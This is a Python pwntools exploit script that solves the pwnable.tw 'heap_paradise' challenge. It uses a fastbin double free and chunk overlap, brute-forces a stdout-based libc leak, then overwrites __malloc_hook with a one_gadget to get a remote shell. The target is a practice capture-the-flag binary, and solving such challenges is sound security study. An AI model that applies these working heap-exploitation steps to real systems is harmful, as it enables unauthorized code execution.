#!/usr/bin/env python2
from pwn import *
import sys

#MyTemplate
elf = ELF("./heap_paradise")
#
# ld = ELF("./ld-2.23.so")

lokal = False
context.binary = elf
#context.arch = ''

s    = lambda data               :xp.send(data)
sa   = lambda delim,data         :xp.sendafter(delim,data)
sl   = lambda data               :xp.sendline(data)
sla  = lambda delim,data         :xp.sendlineafter(delim,data)
r    = lambda numb=4096          :xp.recv(numb)
ru   = lambda delims, drop=True  :xp.recvuntil(delims, drop)
uu64 = lambda x                  :u64(x.ljust(8,"\x00"))
uu32 = lambda x                  :u32(x.ljust(4,"\x00"))

if len(sys.argv) > 1:
	Debug = True
else:
	Debug = False

if lokal:

    libc = elf.libc
else:
	a=''
	host = 'chall.pwnable.tw'
	port = '10308'
	xp = remote(host,port)
	libc = ELF("./libc_64.so.6")

if Debug:
    context.terminal = ["tmux","splitw","-h"]
    cmd = ""
    gdb.attach(xp,cmd)


#Exploit Here
def alloc(size,data):
	sla("Choice:","1")
	sla("Size :",str(size))
	sa("Data :",data)

def free(idx):
	sla("Choice:","2")
	sla("Index :",str(idx))

while True:
	host = 'chall.pwnable.tw'
	port = '10308'
	xp = remote(host,port)
	libc = ELF("./libc_64.so.6")

	alloc(0x40,p64(0)*7 + p64(0x51))
	alloc(0x40,p64(0)*7 + p64(0x51))
	alloc(0x60,p64(0)*3 + p64(0x51) + p64(0)*3 + p64(0x31))

	free(0)
	free(1)
	free(0)

	alloc(0x40,"\x40")
	alloc(0x40,"C")
	alloc(0x40,"D")

	alloc(0x40,"A"*8 + p64(0x71))
	free(1)
	free(6)

	alloc(0x40,"A"*8 + p64(0x91))
	free(1)
	free(6)

	alloc(0x40, 'A' * 8 + p64(0x71) + p16(0x25e5-8))
	alloc(0x60, "\x40")
	print("Libc")
	try:
		alloc(0x60, "A"*(8*6)+"A"*3 + p64(0xfbad1800) + "\x00" * 25)
		leak = u64(xp.recvuntil('\x7f')[-6:].ljust(8, '\x00'))
		print hex(leak)
		libc_base = leak - libc.symbols['_IO_2_1_stderr_'] - 192
		print hex(libc_base)
		if libc_base&0xfff==0:
			print("Found")
			break
		else:
			xp.close()
			continue
	except:
		xp.close()
		continue

malloc_hook_offset = libc.symbols['__malloc_hook']
# one_gadget_offset = [0x45226, 0x4527a, 0xf0364, 0xf1207]
one_gadget_offset = [0x45216, 0x4526a, 0xef6c4, 0xf0567]

one_gadget = libc_base + one_gadget_offset[2]
malloc_hook = libc_base + malloc_hook_offset

free(1)
free(2)
free(1)

alloc(0x60, p64(malloc_hook - 0x23))
alloc(0x60, "A")
alloc(0x60, "A")
alloc(0x60, "A" * 19 + p64(one_gadget))
free(3)
free(3)
xp.interactive()
